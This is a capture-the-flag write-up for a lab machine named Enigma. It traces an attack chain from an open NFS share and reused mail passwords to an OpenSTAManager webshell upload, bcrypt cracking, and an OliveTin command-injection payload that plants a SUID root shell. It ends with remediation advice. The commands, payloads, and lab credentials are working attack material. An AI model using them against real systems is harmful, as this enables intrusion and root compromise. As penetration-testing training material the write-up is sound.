# Enigma — Active Learning Writeup

| Target | Detail |
| :--- | :--- |
| **OS** | Linux |
| **Difficulty** | Easy (active, ID 915) |
| **IP Address** | `10.129.239.191` (VPN `tun0`) |
| **Owned** | 2026-09-27 — User ✅ Root ✅ |
| **Key Concepts** | NFS exposure, password reuse, CVE-2026-38751 (OpenSTAManager RCE), hash cracking, command injection via OliveTin |
| **Time** | ~30 min |

**Attack path (TL;DR):**

```text
nmap → mail (Dovecot) + NFS + nginx vhosts
     → world-readable NFS share → onboarding PDF → mail credentials
     → second mailbox via password reuse → OpenSTAManager admin creds
     → OSM 2.9.8 module-upload RCE (CVE-2026-38751) → www-data
     → DB creds → bcrypt hash → john → su → user.txt
     → OliveTin daemon (root) on localhost → API command injection → root
```

---

## 1. Reconnaissance & Surface Analysis

### Raw Port Scan

```bash
htb machine spawn enigma
nmap -sC -sV -p- --min-rate 1500 -oA recon 10.129.239.191
```

```text
-p-             : scan all 65535 ports (never trust a default list)
--min-rate 1500 : floor of 1500 packets/sec — finish the full sweep fast
-sC / -sV       : default scripts + version detection
-oA recon       : save output in three files
```

```
22/tcp    open  ssh     OpenSSH 9.6p1 (password auth disabled)
80/tcp    open  http    nginx 1.24.0 → 302 to enigma.htb (vhost!)
110/143   open  pop3/imap  Dovecot (993/995 SSL variants also open)
2049/tcp  open  nfs     rpcbind + mountd + NFSv4
```

### Initial Observations

- **Port 22 (SSH):** publickey-only — no password brute even possible.
- **Port 80 (nginx):** redirect to a hostname → vhost discovery, add it
  to `/etc/hosts` before anything else.
- **Ports 110/143 (mail):** requires credentials — *find creds and the
  inbox becomes an intel goldmine*.
- **Port 2049 (NFS):** `showmount -e` will tell us if any export is
  world-readable — file systems are the fastest door when they're open.

### 🧠 Pause & Predict

<details>
<summary><b>Think first:</b> four surfaces at once — which do you
probe first, and do you go sequential or parallel?</summary>

Probe NFS and web **in parallel** (they don't depend on each other).
NFS with a `*` export needs no authentication at all, so it's the
cheapest possible win; web enumeration runs meanwhile. SSH is a dead
end until creds exist; mail is a *consumer* of credentials, not a
source. That ordering logic is why the whole chain started with
`showmount -e` + a vhost fetch in the same minute.
</details>

## 2. Enumeration & Finding the Seam

### What I Investigated

```bash
echo "10.129.239.191 enigma.htb mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts
showmount -e 10.129.239.191
# Export list for 10.129.239.191:
# /srv/nfs/onboarding *
```

```text
showmount -e : ask the NFS server which exports exist and who may mount them
-e           : print the export list
*            : ANY client IP may mount — effectively public
```

### 🧠 Interactive Challenge

<details>
<summary><b>Challenge:</b> the export list shows
<code>/srv/nfs/onboarding *</code>. Before reading any file — what
kind of content do you expect and where does it usually lead?</summary>

An export named "onboarding" almost always holds HR/IT documents:
welcome PDFs, credential sheets, network diagrams. Expect
credentials-in-a-document as the intended lead, and open files before
touching heavier services.
</details>

### ❌ Failure Log — What I Tried First & Why It Failed

1. Ran `mount -t nfs ...` **inside the Kali container** → **Result:**
   `Operation not permitted`.
   *Takeaway:* containers ship without `CAP_SYS_ADMIN`; mounting is a
   privileged syscall. Fix: launch a throwaway `--privileged`
   sidecar sharing our network namespace
   (`--network container:kali`) and mount there.
2. Logged into **POP3 (110)** with the PDF credentials → **Result:**
   `Plaintext authentication disallowed on non-secure connections`.
   *Takeaway:* auth rejection ≠ wrong password — the *channel* may be
   the problem. Retry on **IMAP SSL (993)** → login succeeded.
3. Ran `echo pass | su - haris -c id` → **Result:** always
   `Authentication failure`.
   *Takeaway:* `su` reads the password from a TTY, not a pipe. The
   error message lies. Fix: spawn a real pseudo-terminal
   (`python3 pty.fork()`) and write the password to it → instant
   success.
4. Fed three known passwords to `sudo -S -l` as `www-data` →
   **Result:** all wrong; `sudo -n -l` confirmed the user isn't in
   sudoers at all.
5. From `www-data`, TCP connect to OliveTin on `127.0.0.1:1337` →
   **Result:** connection timeout even though `ss` showed LISTEN.
   Probes: `3306 OK / 1337 FAIL` (as www-data) vs `1337 OK` (as
   haris) → **UID-based OUTPUT firewall**.
   *Takeaway:* "port is open" is incomplete — *who* may connect is a
   separate rule. Debug loopback per-uid before declaring a service
   dead.
6. Called the OliveTin API with `{"actionId":...}` → **Result:**
   `action with ID  not found` (empty). Wrong path first
   (`/olivetin...` → served the SPA's index.html), then wrong field.
   *Takeaway:* don't guess protobuf JSON — pull the service/method
   from binary `strings` and the `.proto` from the upstream repo.
   Fields were `binding_id` + `arguments[{name,value}]`, not
   `action_id`.
7. Sent the injection payload inline in a shell `curl -d '...'` →
   **Result:** quote broke early and the payload executed in *my*
   local shell instead of against the API.
   *Takeaway:* when a payload contains quotes/semicolons, base64 the
   JSON body and decode on the fly — never hand-wrap it in quotes.

### The Breakthrough (Root Cause Breakdown)

**Flaw #1 — World-readable NFS export:** `*` means any client may
mount; no authentication stands between the network and the files.

**Flaw #2 — Password reuse:** the same password worked for two
different mailboxes, turning one leaked document into two inboxes.

**Flaw #3 — CVE-2026-38751 (OpenSTAManager ≤ 2.10):** the module
update feature unpacks an attacker-supplied ZIP into the web root with
no content validation → arbitrary PHP execution.

**Flaw #4 — Shell command injection (OliveTin):** the daemon runs
actions as root by interpolating an attacker-controlled argument into
a `shell:` string inside single quotes — classic quote-breakout.

**Real-World Analogies:**

> *NFS `*`:* an office filing cabinet left unlocked in a lobby that
> everyone may enter.
>
> *Password reuse:* one key cut for your home, bike, and office —
> losing it once loses all three.
>
> *Command injection:* a receptionist who reads your "password" aloud
> into the boss's shell command — you answer `x'; my-order; #` and she
> pastes it verbatim; everything after `#` (the rest of the boss's
> order) becomes a comment.
>
> *UID firewall:* a staff-only lift — the customer (www-data) presses
> and the doors stay shut, but a staff badge (haris) opens them.

<details>
<summary><b>🧠 Mini-challenge:</b> the vulnerable shell line is
<code>mysqldump -u USER -p'PASS' DB &gt; out.sql</code> and
<code>PASS</code> is attacker-controlled. What three-part payload
runs your own commands then hides the rest?</summary>

Close the quote → inject commands → comment out the tail:
<code>x'; id; #</code>. Parsed as: run <code>mysqldump -u USER -p'x'</code>,
then <code>id</code>, then everything after <code>#</code> is ignored.
</details>

## 3. Foothold (Initial Access)

### Stage A — NFS → PDF → mail credentials

```text
Command structure (privileged sidecar mount):
docker run -d --rm --network container:kali --privileged --name nfsdump \
  <image> sleep 7200
docker exec nfsdump mount -t nfs -o nolock,vers=3,addr=<ip> \
  <ip>:/srv/nfs/onboarding /mnt/x
```

```text
--network container:kali : join OUR netns — the target is only reachable via our VPN tun0
--privileged             : gain CAP_SYS_ADMIN so mount() is allowed
-o nolock,vers=3         : skip the lock daemon + force NFSv3 (compatibility)
```

```bash
docker exec nfsdump cat /mnt/x/New_Employee_Access.pdf > /tmp/
pdftotext /tmp/New_Employee_Access.pdf -
```

```text
pdftotext <file> - : extract text to stdout (humans read text, not PDF binary)
```

```text
URL: http://mail001.enigma.htb   Username: kevin   Password: Enigma2024!
```

### Stage B — Mailbox hopping (password reuse)

```text
Syntax structure:
M = imaplib.IMAP4_SSL(<host>, 993)
M.login(<user>, <pass>)
```

<details>
<summary><b>Task:</b> kevin's mailbox only has a welcome mail. What
single cheap test can turn this into a second inbox?</summary>

Try kevin's password against the *other* mailbox owner (sarah).
Password reuse is the most common weak pattern in every org — and here
it worked immediately.
</details>

```python
M = imaplib.IMAP4_SSL('10.129.239.191', 993)
M.login('kevin', 'Enigma2024!')   # welcome mail only
M.login('sarah', 'Enigma2024!')   # reuse test → INBOX opened
```

Sarah's inbox holds the IT reply:

```text
OpenSTAManager → http://support_001.enigma.htb
admin : Ne3s4rtars78s
```

### Stage C — OpenSTAManager → www-data (CVE-2026-38751)

Version fingerprint came from static assets
(`app.min.css?v=2.9.8`) → public-advisory search → exact-fit CVE.

```text
Request chain (authenticated arbitrary module upload):
1. POST /index.php?op=login            → session cookie
2. POST /ajax.php?a=check_module_updates_settings   → enable updates
3. POST /modules/aggiornamenti/upload_modules.php   → ZIP: shell/MODULE + shell/shell.php
4. GET  /modules/shell/shell.php?c=id  → RCE
```

**Why it worked:** the module unpacker trusted the ZIP completely —
it treats an uploaded module as first-party code (root of trust), so
a `.php` file lands inside the web root and executes.

```text
uid=33(www-data)
```

## 4. Privilege Escalation

### Internal Audits (order matters)

```bash
sudo -l                                 # (as www-data) → not in sudoers
find / -perm -4000 -type f 2>/dev/null  # → standard SUID only
getcap -r / 2>/dev/null                 # → standard capabilities only
```

Nothing exotic on disk → pivot: **read the app's own configuration**.

```bash
grep -E 'db_username|db_password' /var/www/html/openstamanager/config.inc.php
# brollin : Fri3nds@9099
```

```bash
mysql -ubrollin -p'Fri3nds@9099' openstamanager -N -e \
  'SELECT username,password FROM zz_users'
# haris : $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

```text
-N : drop column headers — raw values only (script-friendly)
```

### The Misconfiguration

- **Hash:** bcrypt (`$2y$10$...`) — algorithm is fine, but the
  underlying password was dictionary-grade.
- **Same hash also doubles as the system login** for that user (mail
  auth proved it via PAM).

### 🧠 Privesc Reasoning

<details>
<summary><b>Q:</b> why did I reach for <code>john</code> instead of
writing my own cracker — and why did it finish in 2 seconds?</summary>

bcrypt at cost10 already has mature GPU/CPU crackers; reinventing one
is waste. It finished in 2 seconds because the password sat near the
top of `rockyou.txt` — hashing strength is irrelevant against weak
*password choice*. Lesson: algorithm reviews ≠ password policy.
</details>

```bash
echo '$2y$10$WHf1...' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
# bestfriends
```

```text
--format=bcrypt : force the correct category — auto-detection often
                  misclassifies $2y$ hashes on the first pass
```

### TTY requirement for `su`

```text
Syntax structure:
python3 -c 'import pty,os,time
pid,fd=pty.fork()
if pid==0: os.execvp("su",[...])
else: time.sleep(0.8); os.write(fd,b"<password>\n")'
```

<details>
<summary><b>Task:</b> <code>echo pass | su - user -c id</code> always
fails with "Authentication failure" though the password is correct.
Why, and what replaces the pipe?</summary>

<code>su</code> reads from a TTY, never stdin — so a pipe silently
never delivers the password. Replace it with a pseudo-terminal
(Python <code>pty.fork()</code>, or <code>script -qec</code>) and
write the password to the master side.
</details>

```
<flag — redacted from notes, see §5>
```

### Root — OliveTin API command injection

Recon found `/usr/local/bin/OliveTin` running as **root**; its config
(`/etc/OliveTin/config.yaml`) contains:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - {name: db_pass, type: password}   # free text, interpolated in single quotes
```

The API lives on `127.0.0.1:1337` but a UID-based firewall blocks
`www-data` → the call must originate from **haris's** session.
OliveTin speaks **ConnectRPC** (protobuf over JSON):

```text
Service/Method (from binary strings):
/api/olivetin.api.v1.OliveTinApiService/StartAction
Fields (from upstream .proto): binding_id + arguments[{name,value}]
```

```bash
curl -s -X POST \
  -H 'Content-Type: application/json' \
  -H 'Connect-Protocol-Version: 1' \
  -d '{"binding_id":"backup_database","arguments":[
        {"name":"db_user","value":"backup_svc"},
        {"name":"db_pass","value":"x';cp /bin/bash /tmp/.rsh;chmod 4755 /tmp/.rsh;chmod o+r /tmp/.rsh;#"},
        {"name":"db_name","value":"production"}]}' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
```

**Why it worked:** OliveTin executes `shell:` strings through a real
shell as root. Our `db_pass` lands inside single quotes — we broke
out, inserted commands, and `#` commented out the remainder:

```text
mysqldump -u backup_svc -p'x'; <our commands>; #' production > ...
                      └ quote closes  └ executed  └ tail neutralized
```

```bash
/tmp/.rsh -p -c 'id; cat /root/root.txt'
# euid=0(root)
```

```text
bash -p : "privileged mode" — without it, bash drops the effective
          root UID back to the real one on startup
```

Cleanup: webshell, SUID bash, and the sidecar container were all
removed before submission.

## 5. Flags

> **Rule: flags are never written into these notes** — re-run the box
> to regenerate them (passive readers don't get free flags, and I don't
> get passive memories).

```text
user : <from the NFS/mail chain — submitted ✓>
root : <after OliveTin privesc — submitted ✓>
```

```bash
htb machine own <flag>
```

## 6. Defense & Remediation (The Sysadmin View)

| Stage | Issue | Secure Fix |
| :--- | :--- | :--- |
| File share | NFS export with `*` (any client) | Export to specific subnets/hosts only; enable `root_squash`; move sensitive docs off shares |
| Mail | Password reused across mailboxes; POP3 plaintext offered | Unique per-user credentials (password manager); plaintext auth disabled (already on) |
| Web app | OpenSTAManager 2.9.8 (known RCE ≤ 2.10) | Upgrade past the advisory; restrict `/modules/aggiornamenti/` to trusted IPs |
| App config | DB password readable inside web root (`config.inc.php`) | Move config outside the document root; `chmod 640`; dedicated low-priv DB user |
| Automation | OliveTin interpolates args into `shell:` strings run as root | Use `exec:` array form (no shell parsing) or strict shell-quoting of every argument; enable API auth (`authRequireGuestsToLogin: true`) |
| Host | UID-based loopback firewall without app-layer auth | Keep network rules as defense-in-depth, but authenticate the service itself too |

## 7. Key Takeaways

1. **An auth error is a channel error until proven otherwise** — POP3
   rejection became an IMAP-SSL login.
2. **`su`'s TTY requirement** is the #1 beginner trap; the error
   message blames the password instead of the missing terminal.
3. **Version → CVE first, exploit writing never** — fingerprint the
   app, then read advisories.
4. **Never guess an RPC API** — extract methods from `strings`, read
   the `.proto` upstream; field names will bite you.
5. **Loopback firewalls filter *by uid*, not just by port** — test
   connectivity per-user before diagnosing a service as dead.
6. **Quote-sensitive payloads go through base64**, never inline shell
   quoting.

## 8. 🧠 Active Recall Challenges (Before You Close This Box)

- [ ] **Challenge 1:** the privileged sidecar trick used
      `--network container:kali`. Without it, name two ways to reach a
      target that is only routable through someone else's VPN.
- [ ] **Challenge 2:** reproduce the injection locally: run
      `sh -c "echo -p'x'; id; #'" ` and explain the parse tree — which
      tokens reach the binary, which become a comment?
- [ ] **Challenge 3:** the OliveTin config also offers an `exec:`
      array form. Rewrite the vulnerable action with `exec:` so the
      same payload becomes harmless — and explain why.

<details>
<summary><b>Answers</b> (attempt first, then open)</summary>

1. (a) Move the VPN to the host and route/docker-bridge normally;
   (b) run the VPN client in a sidecar with `--cap-add NET_ADMIN`
   sharing a user-defined bridge network with your tools container.
2. The shell tokenizes: command `echo`, argument `-p'x'` (quotes
   consumed), then `;` starts a new command `id`, then `#` comments
   out everything after it. Only `echo` and `id` execute.
3. `exec: ["mysqldump", "-u", "{{db_user}}", "-p{{db_pass}}", ...]`
   — arguments are passed as a literal argv array to the binary; no
   shell ever parses them, so `'; id; #` is just a weird password
   string.
</details>

---

**Final Checklist (before publishing):**
- [ ] Could a newcomer parse every command? (flags broken down)
- [ ] Is the *WHY* of the first move explained? (NFS+web parallel, IMAP switch)
- [ ] Are failures documented? (7 entries in the Failure Log)
- [ ] Does command order match what actually ran? ✓
